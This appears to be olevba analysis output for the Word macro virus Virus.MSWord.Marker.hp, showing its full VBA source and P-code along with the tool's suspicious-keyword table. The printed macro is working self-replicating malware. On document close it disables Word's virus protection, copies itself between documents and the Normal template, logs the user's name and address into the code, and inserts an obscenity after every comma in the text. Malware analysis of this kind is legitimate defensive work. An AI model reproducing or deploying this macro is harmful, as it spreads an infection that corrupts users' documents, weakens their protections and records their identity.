olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.hp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








' АНТИ-ТЕЛЕПУЗИК
'
'





Private Sub Document_Close()
   On Error Resume Next
   Dim vir, dot As Object
   Dim s As String
   Dim viris, dotis As Boolean
   Set vir = ActiveDocument.VBProject.VBComponents.Item(1)
   Set dot = NormalTemplate.VBProject.VBComponents.Item(1)
   viris = False
   dotis = False
   If vir.CodeModule.CountOfLines <> 0 Then viris = True
   If dot.CodeModule.CountOfLines <> 0 Then dotis = True
   If (viris = True Xor dotis = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If viris = True Then
            Options.VirusProtection = False
            s = vir.CodeModule.Lines(1, vir.CodeModule.CountOfLines)
            dot.CodeModule.InsertLines 1, s
            If NormalTemplate.Saved = True Then NormalTemplate.Save
        End If
        If dotis = True Then
            s = dot.CodeModule.Lines(1, dot.CodeModule.CountOfLines)
            s = s & Chr(13) & Chr(13) & "' " & Application.UserName & "@" & Application.UserAddress & Format(Time, " hh:mm:ss - ") & Format(Date, "dddd, d mmm yyyy")
            vir.CodeModule.InsertLines 1, s
            If ActiveDocument.Saved = True Then ActiveDocument.Save
        End If
   End If
   
   Randomize (666)
   'If Round(Rnd * 50) = 13 Then MsgBox "Я НЕНАВИЖУ ТЕЛЕПУЗИКОВ!!!", vbExclamation
   'If Round(Rnd * 13) = 3 Then
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = ", "
        .Replacement.Text = ", бля, "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
   'End If
End Sub



' Dmitrij@ 14:20:46 - среда, 20 июн 2001

' ‘Ґа¦@ 17:29:01 - понедельник, 2 июл 2001

' fayer@aku@tanak-cakap.com 18:13:43 - пятница, 25 май 2001
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.hp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4165 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x000F " АНТИ-ТЕЛЕПУЗИК"
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub Document_Close())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	Dim 
' 	VarDefn vir
' 	VarDefn dot (As Object)
' Line #19:
' 	Dim 
' 	VarDefn s (As String)
' Line #20:
' 	Dim 
' 	VarDefn viris
' 	VarDefn dotis (As Boolean)
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set vir 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set dot 
' Line #23:
' 	LitVarSpecial (False)
' 	St viris 
' Line #24:
' 	LitVarSpecial (False)
' 	St dotis 
' Line #25:
' 	Ld vir 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St viris 
' 	EndIf 
' Line #26:
' 	Ld dot 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St dotis 
' 	EndIf 
' Line #27:
' 	Ld viris 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld dotis 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld viris 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld vir 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld vir 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld dot 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld dotis 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld dot 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld dot 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #36:
' 	Ld s 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 "@"
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000C " hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St s 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld vir 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	LitDI2 0x029A 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #43:
' 	QuoteRem 0x0003 0x004E "If Round(Rnd * 50) = 13 Then MsgBox "Я НЕНАВИЖУ ТЕЛЕПУЗИКОВ!!!", vbExclamation"
' Line #44:
' 	QuoteRem 0x0003 0x001B "If Round(Rnd * 13) = 3 Then"
' Line #45:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #46:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #47:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #48:
' 	LitStr 0x0002 ", "
' 	MemStWith Then 
' Line #49:
' 	LitStr 0x0007 ", бля, "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #50:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #51:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #52:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #53:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #54:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #55:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #56:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #57:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #58:
' 	EndWith 
' Line #59:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #60:
' 	QuoteRem 0x0003 0x0006 "End If"
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x0027 " Dmitrij@ 14:20:46 - среда, 20 июн 2001"
' Line #66:
' Line #67:
' 	QuoteRem 0x0000 0x0029 " ‘Ґа¦@ 17:29:01 - понедельник, 2 июл 2001"
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x003A " fayer@aku@tanak-cakap.com 18:13:43 - пятница, 25 май 2001"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

